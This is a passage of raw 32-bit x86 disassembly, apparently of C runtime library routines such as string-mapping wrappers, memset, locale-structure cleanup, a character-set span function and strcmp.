  427777:	cmp    esi,ebx
  427779:	je     0x427937
  42777f:	mov    DWORD PTR [ebp-0x4],0x1
  427786:	lea    eax,[esi+esi*1]
  427789:	add    eax,0x3
  42778c:	and    eax,0xfffffffc
  42778f:	call   0x425390
  427794:	mov    DWORD PTR [ebp-0x18],esp
  427797:	mov    eax,esp
  427799:	mov    DWORD PTR [ebp-0x2c],eax
  42779c:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277a0:	jmp    0x4277bd
  4277a2:	xor    eax,eax
  4277a4:	inc    eax
  4277a5:	ret    
  4277a6:	mov    esp,DWORD PTR [ebp-0x18]
  4277a9:	call   0x4287d5
  4277ae:	xor    ebx,ebx
  4277b0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277b3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ba:	mov    esi,DWORD PTR [ebp-0x28]
  4277bd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277c0:	jne    0x4277de
  4277c2:	lea    eax,[esi+esi*1]
  4277c5:	push   eax
  4277c6:	call   0x426062
  4277cb:	pop    ecx
  4277cc:	mov    DWORD PTR [ebp-0x2c],eax
  4277cf:	cmp    eax,ebx
  4277d1:	je     0x427937
  4277d7:	mov    DWORD PTR [ebp-0x20],0x1
  4277de:	push   esi
  4277df:	push   DWORD PTR [ebp-0x2c]
  4277e2:	push   DWORD PTR [ebp+0x14]
  4277e5:	push   DWORD PTR [ebp+0x10]
  4277e8:	push   0x1
  4277ea:	push   DWORD PTR [ebp+0x20]
  4277ed:	call   DWORD PTR ds:0x4290ec
  4277f3:	test   eax,eax
  4277f5:	je     0x4278e1
  4277fb:	push   ebx
  4277fc:	push   ebx
  4277fd:	push   esi
  4277fe:	push   DWORD PTR [ebp-0x2c]
  427801:	push   DWORD PTR [ebp+0xc]
  427804:	push   DWORD PTR [ebp+0x8]
  427807:	call   DWORD PTR ds:0x4290f0
  42780d:	mov    edi,eax
  42780f:	mov    DWORD PTR [ebp-0x1c],edi
  427812:	cmp    edi,ebx
  427814:	je     0x4278e1
  42781a:	test   BYTE PTR [ebp+0xd],0x4
  42781e:	je     0x42784d
  427820:	cmp    DWORD PTR [ebp+0x1c],ebx
  427823:	je     0x4278e1
  427829:	cmp    edi,DWORD PTR [ebp+0x1c]
  42782c:	jg     0x4278e1
  427832:	push   DWORD PTR [ebp+0x1c]
  427835:	push   DWORD PTR [ebp+0x18]
  427838:	push   esi
  427839:	push   DWORD PTR [ebp-0x2c]
  42783c:	push   DWORD PTR [ebp+0xc]
  42783f:	push   DWORD PTR [ebp+0x8]
  427842:	call   DWORD PTR ds:0x4290f0
  427848:	jmp    0x4278e1
  42784d:	mov    DWORD PTR [ebp-0x4],0x2
  427854:	lea    eax,[edi+edi*1]
  427857:	add    eax,0x3
  42785a:	and    eax,0xfffffffc
  42785d:	call   0x425390
  427862:	mov    DWORD PTR [ebp-0x18],esp
  427865:	mov    eax,esp
  427867:	mov    DWORD PTR [ebp-0x30],eax
  42786a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42786e:	jmp    0x42788b
  427870:	xor    eax,eax
  427872:	inc    eax
  427873:	ret    
  427874:	mov    esp,DWORD PTR [ebp-0x18]
  427877:	call   0x4287d5
  42787c:	xor    ebx,ebx
  42787e:	mov    DWORD PTR [ebp-0x30],ebx
  427881:	or     DWORD PTR [ebp-0x4],0xffffffff
  427885:	mov    edi,DWORD PTR [ebp-0x1c]
  427888:	mov    esi,DWORD PTR [ebp-0x28]
  42788b:	cmp    DWORD PTR [ebp-0x30],ebx
  42788e:	jne    0x4278a8
  427890:	lea    eax,[edi+edi*1]
  427893:	push   eax
  427894:	call   0x426062
  427899:	pop    ecx
  42789a:	mov    DWORD PTR [ebp-0x30],eax
  42789d:	cmp    eax,ebx
  42789f:	je     0x4278e1
  4278a1:	mov    DWORD PTR [ebp-0x24],0x1
  4278a8:	push   edi
  4278a9:	push   DWORD PTR [ebp-0x30]
  4278ac:	push   esi
  4278ad:	push   DWORD PTR [ebp-0x2c]
  4278b0:	push   DWORD PTR [ebp+0xc]
  4278b3:	push   DWORD PTR [ebp+0x8]
  4278b6:	call   DWORD PTR ds:0x4290f0
  4278bc:	test   eax,eax
  4278be:	je     0x4278e1
  4278c0:	push   ebx
  4278c1:	push   ebx
  4278c2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278c5:	jne    0x4278cb
  4278c7:	push   ebx
  4278c8:	push   ebx
  4278c9:	jmp    0x4278d1
  4278cb:	push   DWORD PTR [ebp+0x1c]
  4278ce:	push   DWORD PTR [ebp+0x18]
  4278d1:	push   edi
  4278d2:	push   DWORD PTR [ebp-0x30]
  4278d5:	push   ebx
  4278d6:	push   DWORD PTR [ebp+0x20]
  4278d9:	call   DWORD PTR ds:0x42907c
  4278df:	mov    edi,eax
  4278e1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278e4:	je     0x4278ef
  4278e6:	push   DWORD PTR [ebp-0x30]
  4278e9:	call   0x425f4a
  4278ee:	pop    ecx
  4278ef:	cmp    DWORD PTR [ebp-0x20],ebx
  4278f2:	je     0x4278fd
  4278f4:	push   DWORD PTR [ebp-0x2c]
  4278f7:	call   0x425f4a
  4278fc:	pop    ecx
  4278fd:	mov    eax,edi
  4278ff:	jmp    0x427a5f
  427904:	mov    DWORD PTR [ebp-0x34],ebx
  427907:	xor    edi,edi
  427909:	mov    DWORD PTR [ebp-0x38],ebx
  42790c:	cmp    DWORD PTR [ebp+0x8],ebx
  42790f:	jne    0x427919
  427911:	mov    eax,ds:0x45dda4
  427916:	mov    DWORD PTR [ebp+0x8],eax
  427919:	cmp    DWORD PTR [ebp+0x20],ebx
  42791c:	jne    0x427926
  42791e:	mov    eax,ds:0x45ddb4
  427923:	mov    DWORD PTR [ebp+0x20],eax
  427926:	push   DWORD PTR [ebp+0x8]
  427929:	call   0x4285bd
  42792e:	pop    ecx
  42792f:	mov    DWORD PTR [ebp-0x3c],eax
  427932:	cmp    eax,0xffffffff
  427935:	jne    0x42793e
  427937:	xor    eax,eax
  427939:	jmp    0x427a5f
  42793e:	cmp    eax,DWORD PTR [ebp+0x20]
  427941:	je     0x427a35
  427947:	push   ebx
  427948:	push   ebx
  427949:	lea    ecx,[ebp+0x14]
  42794c:	push   ecx
  42794d:	push   DWORD PTR [ebp+0x10]
  427950:	push   eax
  427951:	push   DWORD PTR [ebp+0x20]
  427954:	call   0x428606
  427959:	add    esp,0x18
  42795c:	mov    DWORD PTR [ebp-0x34],eax
  42795f:	cmp    eax,ebx
  427961:	je     0x427937
  427963:	push   ebx
  427964:	push   ebx
  427965:	push   DWORD PTR [ebp+0x14]
  427968:	push   eax
  427969:	push   DWORD PTR [ebp+0xc]
  42796c:	push   DWORD PTR [ebp+0x8]
  42796f:	call   DWORD PTR ds:0x4290e8
  427975:	mov    esi,eax
  427977:	mov    DWORD PTR [ebp-0x40],esi
  42797a:	cmp    esi,ebx
  42797c:	je     0x427a24
  427982:	mov    DWORD PTR [ebp-0x4],ebx
  427985:	add    eax,0x3
  427988:	and    eax,0xfffffffc
  42798b:	call   0x425390
  427990:	mov    DWORD PTR [ebp-0x18],esp
  427993:	mov    edi,esp
  427995:	mov    DWORD PTR [ebp-0x44],edi
  427998:	push   esi
  427999:	push   ebx
  42799a:	push   edi
  42799b:	call   0x427c40
  4279a0:	add    esp,0xc
  4279a3:	jmp    0x4279b5
  4279a5:	xor    eax,eax
  4279a7:	inc    eax
  4279a8:	ret    
  4279a9:	mov    esp,DWORD PTR [ebp-0x18]
  4279ac:	call   0x4287d5
  4279b1:	xor    ebx,ebx
  4279b3:	xor    edi,edi
  4279b5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279b9:	cmp    edi,ebx
  4279bb:	jne    0x4279e0
  4279bd:	push   DWORD PTR [ebp-0x40]
  4279c0:	call   0x426062
  4279c5:	pop    ecx
  4279c6:	mov    edi,eax
  4279c8:	cmp    edi,ebx
  4279ca:	je     0x4279fd
  4279cc:	push   DWORD PTR [ebp-0x40]
  4279cf:	push   ebx
  4279d0:	push   edi
  4279d1:	call   0x427c40
  4279d6:	add    esp,0xc
  4279d9:	mov    DWORD PTR [ebp-0x38],0x1
  4279e0:	push   DWORD PTR [ebp-0x40]
  4279e3:	push   edi
  4279e4:	push   DWORD PTR [ebp+0x14]
  4279e7:	push   DWORD PTR [ebp-0x34]
  4279ea:	push   DWORD PTR [ebp+0xc]
  4279ed:	push   DWORD PTR [ebp+0x8]
  4279f0:	call   DWORD PTR ds:0x4290e8
  4279f6:	mov    DWORD PTR [ebp-0x40],eax
  4279f9:	cmp    eax,ebx
  4279fb:	jne    0x427a01
  4279fd:	xor    esi,esi
  4279ff:	jmp    0x427a27
  427a01:	push   DWORD PTR [ebp+0x1c]
  427a04:	push   DWORD PTR [ebp+0x18]
  427a07:	lea    eax,[ebp-0x40]
  427a0a:	push   eax
  427a0b:	push   edi
  427a0c:	push   DWORD PTR [ebp+0x20]
  427a0f:	push   DWORD PTR [ebp-0x3c]
  427a12:	call   0x428606
  427a17:	add    esp,0x18
  427a1a:	mov    esi,eax
  427a1c:	neg    esi
  427a1e:	sbb    esi,esi
  427a20:	neg    esi
  427a22:	jmp    0x427a27
  427a24:	mov    esi,DWORD PTR [ebp-0x48]
  427a27:	cmp    DWORD PTR [ebp-0x38],ebx
  427a2a:	je     0x427a4f
  427a2c:	push   edi
  427a2d:	call   0x425f4a
  427a32:	pop    ecx
  427a33:	jmp    0x427a4f
  427a35:	push   DWORD PTR [ebp+0x1c]
  427a38:	push   DWORD PTR [ebp+0x18]
  427a3b:	push   DWORD PTR [ebp+0x14]
  427a3e:	push   DWORD PTR [ebp+0x10]
  427a41:	push   DWORD PTR [ebp+0xc]
  427a44:	push   DWORD PTR [ebp+0x8]
  427a47:	call   DWORD PTR ds:0x4290e8
  427a4d:	mov    esi,eax
  427a4f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a52:	je     0x427a5d
  427a54:	push   DWORD PTR [ebp-0x34]
  427a57:	call   0x425f4a
  427a5c:	pop    ecx
  427a5d:	mov    eax,esi
  427a5f:	lea    esp,[ebp-0x54]
  427a62:	call   0x42537b
  427a67:	ret    
  427a68:	push   0x1c
  427a6a:	push   0x429e80
  427a6f:	call   0x425340
  427a74:	xor    esi,esi
  427a76:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a7c:	jne    0x427ab3
  427a7e:	lea    eax,[ebp-0x1c]
  427a81:	push   eax
  427a82:	xor    edi,edi
  427a84:	inc    edi
  427a85:	push   edi
  427a86:	push   0x429e54
  427a8b:	push   edi
  427a8c:	call   DWORD PTR ds:0x4290f8
  427a92:	test   eax,eax
  427a94:	je     0x427a9e
  427a96:	mov    DWORD PTR ds:0x45ddc0,edi
  427a9c:	jmp    0x427ab3
  427a9e:	call   DWORD PTR ds:0x429044
  427aa4:	cmp    eax,0x78
  427aa7:	jne    0x427ab3
  427aa9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ab3:	mov    eax,ds:0x45ddc0
  427ab8:	cmp    eax,0x2
  427abb:	je     0x427bab
  427ac1:	cmp    eax,esi
  427ac3:	je     0x427bab
  427ac9:	cmp    eax,0x1
  427acc:	jne    0x427bd1
  427ad2:	mov    DWORD PTR [ebp-0x20],esi
  427ad5:	mov    DWORD PTR [ebp-0x24],esi
  427ad8:	cmp    DWORD PTR [ebp+0x18],esi
  427adb:	jne    0x427ae5
  427add:	mov    eax,ds:0x45ddb4
  427ae2:	mov    DWORD PTR [ebp+0x18],eax
  427ae5:	push   esi
  427ae6:	push   esi
  427ae7:	push   DWORD PTR [ebp+0x10]
  427aea:	push   DWORD PTR [ebp+0xc]
  427aed:	xor    eax,eax
  427aef:	cmp    DWORD PTR [ebp+0x20],esi
  427af2:	setne  al
  427af5:	lea    eax,[eax*8+0x1]
  427afc:	push   eax
  427afd:	push   DWORD PTR [ebp+0x18]
  427b00:	call   DWORD PTR ds:0x4290ec
  427b06:	mov    edi,eax
  427b08:	mov    DWORD PTR [ebp-0x28],edi
  427b0b:	test   edi,edi
  427b0d:	je     0x427bd1
  427b13:	and    DWORD PTR [ebp-0x4],0x0
  427b17:	lea    ebx,[edi+edi*1]
  427b1a:	mov    eax,ebx
  427b1c:	add    eax,0x3
  427b1f:	and    eax,0xfffffffc
  427b22:	call   0x425390
  427b27:	mov    DWORD PTR [ebp-0x18],esp
  427b2a:	mov    esi,esp
  427b2c:	mov    DWORD PTR [ebp-0x2c],esi
  427b2f:	push   ebx
  427b30:	push   0x0
  427b32:	push   esi
  427b33:	call   0x427c40
  427b38:	add    esp,0xc
  427b3b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b3f:	jmp    0x427b56
  427b41:	xor    eax,eax
  427b43:	inc    eax
  427b44:	ret    
  427b45:	mov    esp,DWORD PTR [ebp-0x18]
  427b48:	call   0x4287d5
  427b4d:	xor    esi,esi
  427b4f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b53:	mov    edi,DWORD PTR [ebp-0x28]
  427b56:	test   esi,esi
  427b58:	jne    0x427b71
  427b5a:	push   edi
  427b5b:	push   0x2
  427b5d:	call   0x426458
  427b62:	pop    ecx
  427b63:	pop    ecx
  427b64:	mov    esi,eax
  427b66:	test   esi,esi
  427b68:	je     0x427bd1
  427b6a:	mov    DWORD PTR [ebp-0x24],0x1
  427b71:	push   edi
  427b72:	push   esi
  427b73:	push   DWORD PTR [ebp+0x10]
  427b76:	push   DWORD PTR [ebp+0xc]
  427b79:	push   0x1
  427b7b:	push   DWORD PTR [ebp+0x18]
  427b7e:	call   DWORD PTR ds:0x4290ec
  427b84:	test   eax,eax
  427b86:	je     0x427b99
  427b88:	push   DWORD PTR [ebp+0x14]
  427b8b:	push   eax
  427b8c:	push   esi
  427b8d:	push   DWORD PTR [ebp+0x8]
  427b90:	call   DWORD PTR ds:0x4290f8
  427b96:	mov    DWORD PTR [ebp-0x20],eax
  427b99:	cmp    DWORD PTR [ebp-0x24],0x0
  427b9d:	je     0x427ba6
  427b9f:	push   esi
  427ba0:	call   0x425f4a
  427ba5:	pop    ecx
  427ba6:	mov    eax,DWORD PTR [ebp-0x20]
  427ba9:	jmp    0x427c19
  427bab:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bae:	cmp    ebx,esi
  427bb0:	jne    0x427bb8
  427bb2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bb8:	mov    edi,DWORD PTR [ebp+0x18]
  427bbb:	test   edi,edi
  427bbd:	jne    0x427bc5
  427bbf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bc5:	push   ebx
  427bc6:	call   0x4285bd
  427bcb:	pop    ecx
  427bcc:	cmp    eax,0xffffffff
  427bcf:	jne    0x427bd5
  427bd1:	xor    eax,eax
  427bd3:	jmp    0x427c19
  427bd5:	cmp    eax,edi
  427bd7:	je     0x427bf7
  427bd9:	push   0x0
  427bdb:	push   0x0
  427bdd:	lea    ecx,[ebp+0x10]
  427be0:	push   ecx
  427be1:	push   DWORD PTR [ebp+0xc]
  427be4:	push   eax
  427be5:	push   edi
  427be6:	call   0x428606
  427beb:	add    esp,0x18
  427bee:	mov    esi,eax
  427bf0:	test   esi,esi
  427bf2:	je     0x427bd1
  427bf4:	mov    DWORD PTR [ebp+0xc],esi
  427bf7:	push   DWORD PTR [ebp+0x14]
  427bfa:	push   DWORD PTR [ebp+0x10]
  427bfd:	push   DWORD PTR [ebp+0xc]
  427c00:	push   DWORD PTR [ebp+0x8]
  427c03:	push   ebx
  427c04:	call   DWORD PTR ds:0x4290f4
  427c0a:	mov    edi,eax
  427c0c:	test   esi,esi
  427c0e:	je     0x427c17
  427c10:	push   esi
  427c11:	call   0x425f4a
  427c16:	pop    ecx
  427c17:	mov    eax,edi
  427c19:	lea    esp,[ebp-0x38]
  427c1c:	call   0x42537b
  427c21:	ret    
  427c22:	mov    eax,ds:0x45ddc4
  427c27:	test   eax,eax
  427c29:	je     0x427c3a
  427c2b:	push   DWORD PTR [esp+0x4]
  427c2f:	call   eax
  427c31:	test   eax,eax
  427c33:	pop    ecx
  427c34:	je     0x427c3a
  427c36:	xor    eax,eax
  427c38:	inc    eax
  427c39:	ret    
  427c3a:	xor    eax,eax
  427c3c:	ret    
  427c3d:	int3   
  427c3e:	int3   
  427c3f:	int3   
  427c40:	mov    edx,DWORD PTR [esp+0xc]
  427c44:	mov    ecx,DWORD PTR [esp+0x4]
  427c48:	test   edx,edx
  427c4a:	je     0x427c9b
  427c4c:	xor    eax,eax
  427c4e:	mov    al,BYTE PTR [esp+0x8]
  427c52:	push   edi
  427c53:	mov    edi,ecx
  427c55:	cmp    edx,0x4
  427c58:	jb     0x427c8b
  427c5a:	neg    ecx
  427c5c:	and    ecx,0x3
  427c5f:	je     0x427c6d
  427c61:	sub    edx,ecx
  427c63:	mov    BYTE PTR [edi],al
  427c65:	add    edi,0x1
  427c68:	sub    ecx,0x1
  427c6b:	jne    0x427c63
  427c6d:	mov    ecx,eax
  427c6f:	shl    eax,0x8
  427c72:	add    eax,ecx
  427c74:	mov    ecx,eax
  427c76:	shl    eax,0x10
  427c79:	add    eax,ecx
  427c7b:	mov    ecx,edx
  427c7d:	and    edx,0x3
  427c80:	shr    ecx,0x2
  427c83:	je     0x427c8b
  427c85:	rep stos DWORD PTR es:[edi],eax
  427c87:	test   edx,edx
  427c89:	je     0x427c95
  427c8b:	mov    BYTE PTR [edi],al
  427c8d:	add    edi,0x1
  427c90:	sub    edx,0x1
  427c93:	jne    0x427c8b
  427c95:	mov    eax,DWORD PTR [esp+0x8]
  427c99:	pop    edi
  427c9a:	ret    
  427c9b:	mov    eax,DWORD PTR [esp+0x4]
  427c9f:	ret    
  427ca0:	push   esi
  427ca1:	mov    esi,DWORD PTR [esp+0x8]
  427ca5:	test   esi,esi
  427ca7:	je     0x427e2e
  427cad:	push   DWORD PTR [esi+0x4]
  427cb0:	call   0x425f4a
  427cb5:	push   DWORD PTR [esi+0x8]
  427cb8:	call   0x425f4a
  427cbd:	push   DWORD PTR [esi+0xc]
  427cc0:	call   0x425f4a
  427cc5:	push   DWORD PTR [esi+0x10]
  427cc8:	call   0x425f4a
  427ccd:	push   DWORD PTR [esi+0x14]
  427cd0:	call   0x425f4a
  427cd5:	push   DWORD PTR [esi+0x18]
  427cd8:	call   0x425f4a
  427cdd:	push   DWORD PTR [esi]
  427cdf:	call   0x425f4a
  427ce4:	push   DWORD PTR [esi+0x20]
  427ce7:	call   0x425f4a
  427cec:	push   DWORD PTR [esi+0x24]
  427cef:	call   0x425f4a
  427cf4:	push   DWORD PTR [esi+0x28]
  427cf7:	call   0x425f4a
  427cfc:	push   DWORD PTR [esi+0x2c]
  427cff:	call   0x425f4a
  427d04:	push   DWORD PTR [esi+0x30]
  427d07:	call   0x425f4a
  427d0c:	push   DWORD PTR [esi+0x34]
  427d0f:	call   0x425f4a
  427d14:	push   DWORD PTR [esi+0x1c]
  427d17:	call   0x425f4a
  427d1c:	push   DWORD PTR [esi+0x38]
  427d1f:	call   0x425f4a
  427d24:	push   DWORD PTR [esi+0x3c]
  427d27:	call   0x425f4a
  427d2c:	add    esp,0x40
  427d2f:	push   DWORD PTR [esi+0x40]
  427d32:	call   0x425f4a
  427d37:	push   DWORD PTR [esi+0x44]
  427d3a:	call   0x425f4a
  427d3f:	push   DWORD PTR [esi+0x48]
  427d42:	call   0x425f4a
  427d47:	push   DWORD PTR [esi+0x4c]
  427d4a:	call   0x425f4a
  427d4f:	push   DWORD PTR [esi+0x50]
  427d52:	call   0x425f4a
  427d57:	push   DWORD PTR [esi+0x54]
  427d5a:	call   0x425f4a
  427d5f:	push   DWORD PTR [esi+0x58]
  427d62:	call   0x425f4a
  427d67:	push   DWORD PTR [esi+0x5c]
  427d6a:	call   0x425f4a
  427d6f:	push   DWORD PTR [esi+0x60]
  427d72:	call   0x425f4a
  427d77:	push   DWORD PTR [esi+0x64]
  427d7a:	call   0x425f4a
  427d7f:	push   DWORD PTR [esi+0x68]
  427d82:	call   0x425f4a
  427d87:	push   DWORD PTR [esi+0x6c]
  427d8a:	call   0x425f4a
  427d8f:	push   DWORD PTR [esi+0x70]
  427d92:	call   0x425f4a
  427d97:	push   DWORD PTR [esi+0x74]
  427d9a:	call   0x425f4a
  427d9f:	push   DWORD PTR [esi+0x78]
  427da2:	call   0x425f4a
  427da7:	push   DWORD PTR [esi+0x7c]
  427daa:	call   0x425f4a
  427daf:	add    esp,0x40
  427db2:	push   DWORD PTR [esi+0x80]
  427db8:	call   0x425f4a
  427dbd:	push   DWORD PTR [esi+0x84]
  427dc3:	call   0x425f4a
  427dc8:	push   DWORD PTR [esi+0x88]
  427dce:	call   0x425f4a
  427dd3:	push   DWORD PTR [esi+0x8c]
  427dd9:	call   0x425f4a
  427dde:	push   DWORD PTR [esi+0x90]
  427de4:	call   0x425f4a
  427de9:	push   DWORD PTR [esi+0x94]
  427def:	call   0x425f4a
  427df4:	push   DWORD PTR [esi+0x98]
  427dfa:	call   0x425f4a
  427dff:	push   DWORD PTR [esi+0x9c]
  427e05:	call   0x425f4a
  427e0a:	push   DWORD PTR [esi+0xa0]
  427e10:	call   0x425f4a
  427e15:	push   DWORD PTR [esi+0xa4]
  427e1b:	call   0x425f4a
  427e20:	push   DWORD PTR [esi+0xa8]
  427e26:	call   0x425f4a
  427e2b:	add    esp,0x2c
  427e2e:	pop    esi
  427e2f:	ret    
  427e30:	push   esi
  427e31:	mov    esi,DWORD PTR [esp+0x8]
  427e35:	test   esi,esi
  427e37:	je     0x427e8d
  427e39:	mov    eax,DWORD PTR [esi]
  427e3b:	mov    ecx,DWORD PTR ds:0x45d934
  427e41:	cmp    eax,DWORD PTR [ecx]
  427e43:	je     0x427e54
  427e45:	cmp    eax,DWORD PTR ds:0x45d904
  427e4b:	je     0x427e54
  427e4d:	push   eax
  427e4e:	call   0x425f4a
  427e53:	pop    ecx
  427e54:	mov    eax,DWORD PTR [esi+0x4]
  427e57:	mov    ecx,DWORD PTR ds:0x45d934
  427e5d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e60:	je     0x427e71
  427e62:	cmp    eax,DWORD PTR ds:0x45d908
  427e68:	je     0x427e71
  427e6a:	push   eax
  427e6b:	call   0x425f4a
  427e70:	pop    ecx
  427e71:	mov    esi,DWORD PTR [esi+0x8]
  427e74:	mov    eax,ds:0x45d934
  427e79:	cmp    esi,DWORD PTR [eax+0x8]
  427e7c:	je     0x427e8d
  427e7e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e84:	je     0x427e8d
  427e86:	push   esi
  427e87:	call   0x425f4a
  427e8c:	pop    ecx
  427e8d:	pop    esi
  427e8e:	ret    
  427e8f:	push   esi
  427e90:	mov    esi,DWORD PTR [esp+0x8]
  427e94:	test   esi,esi
  427e96:	je     0x427f66
  427e9c:	mov    eax,DWORD PTR [esi+0xc]
  427e9f:	mov    ecx,DWORD PTR ds:0x45d934
  427ea5:	cmp    eax,DWORD PTR [ecx+0xc]
  427ea8:	je     0x427eb9
  427eaa:	cmp    eax,DWORD PTR ds:0x45d910
  427eb0:	je     0x427eb9
  427eb2:	push   eax
  427eb3:	call   0x425f4a
  427eb8:	pop    ecx
  427eb9:	mov    eax,DWORD PTR [esi+0x10]
  427ebc:	mov    ecx,DWORD PTR ds:0x45d934
  427ec2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ec5:	je     0x427ed6
  427ec7:	cmp    eax,DWORD PTR ds:0x45d914
  427ecd:	je     0x427ed6
  427ecf:	push   eax
  427ed0:	call   0x425f4a
  427ed5:	pop    ecx
  427ed6:	mov    eax,DWORD PTR [esi+0x14]
  427ed9:	mov    ecx,DWORD PTR ds:0x45d934
  427edf:	cmp    eax,DWORD PTR [ecx+0x14]
  427ee2:	je     0x427ef3
  427ee4:	cmp    eax,DWORD PTR ds:0x45d918
  427eea:	je     0x427ef3
  427eec:	push   eax
  427eed:	call   0x425f4a
  427ef2:	pop    ecx
  427ef3:	mov    eax,DWORD PTR [esi+0x18]
  427ef6:	mov    ecx,DWORD PTR ds:0x45d934
  427efc:	cmp    eax,DWORD PTR [ecx+0x18]
  427eff:	je     0x427f10
  427f01:	cmp    eax,DWORD PTR ds:0x45d91c
  427f07:	je     0x427f10
  427f09:	push   eax
  427f0a:	call   0x425f4a
  427f0f:	pop    ecx
  427f10:	mov    eax,DWORD PTR [esi+0x1c]
  427f13:	mov    ecx,DWORD PTR ds:0x45d934
  427f19:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f1c:	je     0x427f2d
  427f1e:	cmp    eax,DWORD PTR ds:0x45d920
  427f24:	je     0x427f2d
  427f26:	push   eax
  427f27:	call   0x425f4a
  427f2c:	pop    ecx
  427f2d:	mov    eax,DWORD PTR [esi+0x20]
  427f30:	mov    ecx,DWORD PTR ds:0x45d934
  427f36:	cmp    eax,DWORD PTR [ecx+0x20]
  427f39:	je     0x427f4a
  427f3b:	cmp    eax,DWORD PTR ds:0x45d924
  427f41:	je     0x427f4a
  427f43:	push   eax
  427f44:	call   0x425f4a
  427f49:	pop    ecx
  427f4a:	mov    esi,DWORD PTR [esi+0x24]
  427f4d:	mov    eax,ds:0x45d934
  427f52:	cmp    esi,DWORD PTR [eax+0x24]
  427f55:	je     0x427f66
  427f57:	cmp    esi,DWORD PTR ds:0x45d928
  427f5d:	je     0x427f66
  427f5f:	push   esi
  427f60:	call   0x425f4a
  427f65:	pop    ecx
  427f66:	pop    esi
  427f67:	ret    
  427f68:	int3   
  427f69:	int3   
  427f6a:	int3   
  427f6b:	int3   
  427f6c:	int3   
  427f6d:	int3   
  427f6e:	int3   
  427f6f:	int3   
  427f70:	push   ebp
  427f71:	mov    ebp,esp
  427f73:	push   esi
  427f74:	xor    eax,eax
  427f76:	push   eax
  427f77:	push   eax
  427f78:	push   eax
  427f79:	push   eax
  427f7a:	push   eax
  427f7b:	push   eax
  427f7c:	push   eax
  427f7d:	push   eax
  427f7e:	mov    edx,DWORD PTR [ebp+0xc]
  427f81:	lea    ecx,[ecx+0x0]
  427f84:	mov    al,BYTE PTR [edx]
  427f86:	or     al,al
  427f88:	je     0x427f93
  427f8a:	add    edx,0x1
  427f8d:	bts    DWORD PTR [esp],eax
  427f91:	jmp    0x427f84
  427f93:	mov    esi,DWORD PTR [ebp+0x8]
  427f96:	or     ecx,0xffffffff
  427f99:	lea    ecx,[ecx+0x0]
  427f9c:	add    ecx,0x1
  427f9f:	mov    al,BYTE PTR [esi]
  427fa1:	or     al,al
  427fa3:	je     0x427fae
  427fa5:	add    esi,0x1
  427fa8:	bt     DWORD PTR [esp],eax
  427fac:	jae    0x427f9c
  427fae:	mov    eax,ecx
  427fb0:	add    esp,0x20
  427fb3:	pop    esi
  427fb4:	leave  
  427fb5:	ret    
  427fb6:	int3   
  427fb7:	int3   
  427fb8:	int3   
  427fb9:	int3   
  427fba:	int3   
  427fbb:	int3   
  427fbc:	int3   
  427fbd:	int3   
  427fbe:	int3   
  427fbf:	int3   
  427fc0:	mov    edx,DWORD PTR [esp+0x4]
  427fc4:	mov    ecx,DWORD PTR [esp+0x8]
  427fc8:	test   edx,0x3
  427fce:	jne    0x42800c
  427fd0:	mov    eax,DWORD PTR [edx]
  427fd2:	cmp    al,BYTE PTR [ecx]
  427fd4:	jne    0x428004
  427fd6:	or     al,al
  427fd8:	je     0x428000
  427fda:	cmp    ah,BYTE PTR [ecx+0x1]
  427fdd:	jne    0x428004
  427fdf:	or     ah,ah
  427fe1:	je     0x428000
  427fe3:	shr    eax,0x10
  427fe6:	cmp    al,BYTE PTR [ecx+0x2]
  427fe9:	jne    0x428004
  427feb:	or     al,al
  427fed:	je     0x428000
  427fef:	cmp    ah,BYTE PTR [ecx+0x3]
  427ff2:	jne    0x428004
  427ff4:	add    ecx,0x4
  427ff7:	add    edx,0x4
  427ffa:	or     ah,ah
  427ffc:	jne    0x427fd0
  427ffe:	mov    edi,edi
  428000:	xor    eax,eax
  428002:	ret    
  428003:	nop
  428004:	sbb    eax,eax
  428006:	shl    eax,1
  428008:	add    eax,0x1
  42800b:	ret    
  42800c:	test   edx,0x1
  428012:	je     0x42802c
  428014:	mov    al,BYTE PTR [edx]
  428016:	add    edx,0x1
  428019:	cmp    al,BYTE PTR [ecx]
  42801b:	jne    0x428004
  42801d:	add    ecx,0x1
  428020:	or     al,al
  428022:	je     0x428000
  428024:	test   edx,0x2
  42802a:	je     0x427fd0
  42802c:	mov    ax,WORD PTR [edx]
  42802f:	add    edx,0x2
  428032:	cmp    al,BYTE PTR [ecx]
  428034:	jne    0x428004
  428036:	or     al,al
  428038:	je     0x428000
  42803a:	cmp    ah,BYTE PTR [ecx+0x1]
  42803d:	jne    0x428004
  42803f:	or     ah,ah
  428041:	je     0x428000
  428043:	add    ecx,0x2
  428046:	jmp    0x427fd0
  428048:	int3   
  428049:	int3   
  42804a:	int3   
  42804b:	int3   
  42804c:	int3   
  42804d:	int3   
  42804e:	int3   
  42804f:	int3   
  428050:	mov    eax,DWORD PTR [esp+0xc]
  428054:	test   eax,eax
  428056:	je     0x4280a2
  428058:	mov    edx,DWORD PTR [esp+0x4]
  42805c:	push   esi
  42805d:	push   edi
  42805e:	mov    esi,edx
  428060:	mov    edi,DWORD PTR [esp+0x10]
  428064:	or     edx,edi
  428066:	and    edx,0x3
  428069:	je     0x4280a3
  42806b:	test   eax,0x1
  428070:	je     0x428083
  428072:	mov    cl,BYTE PTR [esi]
  428074:	cmp    cl,BYTE PTR [edi]
  428076:	jne    0x4280d0
  428078:	add    esi,0x1
  42807b:	add    edi,0x1
  42807e:	sub    eax,0x1
  428081:	je     0x4280a0
  428083:	mov    cl,BYTE PTR [esi]
